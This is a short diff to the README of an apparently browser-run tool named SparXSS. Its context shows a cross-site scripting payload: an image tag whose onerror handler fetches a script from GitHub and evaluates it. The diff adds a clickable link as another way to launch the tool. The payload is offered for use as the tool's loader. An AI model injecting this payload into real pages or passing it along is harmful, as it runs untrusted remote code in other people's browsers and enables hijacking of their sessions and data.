@@ -4,6 +4,10 @@ Run it using:
 ```
 <img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r=>r.text()).then(c=>eval(c))'>
 ```
+Or make it a clickable link:
+```
+<a href="https://amukerd.github.io/SparXSS">Click Me!</a>
+```
 
 ## [Changelog](https://github.com/Amukerd/SparXSS/blob/main/Changelog.md)
 
